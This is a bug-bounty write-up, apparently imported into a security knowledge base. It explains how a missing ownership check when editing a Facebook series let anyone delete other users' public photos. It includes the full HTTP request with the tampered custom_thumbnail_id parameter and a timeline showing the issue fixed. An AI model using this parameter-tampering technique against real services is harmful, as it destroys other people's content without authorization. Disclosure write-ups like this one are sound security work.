---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-11-04_delete-any-photos-in-facebook.md
original_filename: 2020-11-04_delete-any-photos-in-facebook.md
title: Delete Any Photos In Facebook
category: documents
detected_topics:
- sso
- access-control
- command-injection
- cors
- business-logic
tags:
- imported
- documents
- sso
- access-control
- command-injection
- cors
- business-logic
language: en
raw_sha256: 8c61f6db7a7bf3c11bb89b612a9515402ae0dd466e4a3b23fec0b8ef377581e5
text_sha256: 6756c453f56511d5ebdbdfbde357ef3e24abac5a7826d802f7c3ca62c504379f
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Delete Any Photos In Facebook

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-11-04_delete-any-photos-in-facebook.md
- Source Type: markdown
- Detected Topics: sso, access-control, command-injection, cors, business-logic
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `8c61f6db7a7bf3c11bb89b612a9515402ae0dd466e4a3b23fec0b8ef377581e5`
- Text SHA256: `6756c453f56511d5ebdbdfbde357ef3e24abac5a7826d802f7c3ca62c504379f`


## Content

---
title: "Delete Any Photos In Facebook"
url: "https://lokeshdlk77.medium.com/delete-any-photos-in-facebook-832dbe81cdc4"
authors: ["Lokesh Kumar (@lokeshdlk77)"]
programs: ["Meta / Facebook"]
bugs: ["Broken authorization", "Logic flaw"]
bounty: "10,750"
publication_date: "2020-11-04"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4158
scraped_via: "browseros"
---

# Delete Any Photos In Facebook

Delete Any Photos In Facebook
Lokesh Kumar
Follow
2 min read
·
Nov 3, 2020

254

1

This post is about an bug that I found on Facebook which used to delete any publicly visible photos by editing the series feature

Already a image removal vulnerability was found in same series feature by another researcher Pouya Darabi . this writeup is a bypassing the fix in different scenario.

The series has a option to set photos in Poster Art (Mandatory) and Cover Image as (optional)

When Creating a new series if attacker tries to modify the photo object of Poster Art and Cover Image the server validation was done properly and return a error. but when editing the series the Ownership check validation for Cover Image was missing.so any publicly visible photo id in Facebook can be associated with the Cover Image.

While replacing the “custom_thumbnail_id=xxx” value into any photo id and it will get associated with the series.

POST /media/manager/shows/edit_show_metadata/?show_id=xxx&title=xxx&description=&custom_thumbnail_id=xxx&is_serialized=false&poster_art_id=xxx&session_id=xxx&av=xxx HTTP/1.1
Host: business.facebook.com
Connection: close
Content-Length: 467
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Viewport-Width: 2048
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://business.facebook.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://business.facebook.com/creatorstudio/?tab=content_shows&collection_id=all_pages
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: sb=xxx; datr=xxx; dpr=1.25; c_user=xxx;
__user=xxx&__a=1&fb_dtsg=xxx

and when deleting the series. all season videos, Poster Arts and Cover Images including victim’s photo also get deleted. but to completely delete the series . it will take around 30 to 45 seconds.

This issue was reported during BountyCon2020 event submission and Thank you Facebook Team for quickly addressing and fixing this issue.

Get Lokesh Kumar’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Video poc:

Timeline:

5-Oct-2020: Report Sent

05-Oct-2020 : Further investigation by Facebook & Temporary Fix

10-Oct-2020: $10000 bounty + $750 bonus awarded by Facebook

31-Oct-2020: Fixed confirmed by Facebook and me

Press enter or click to view image in full size
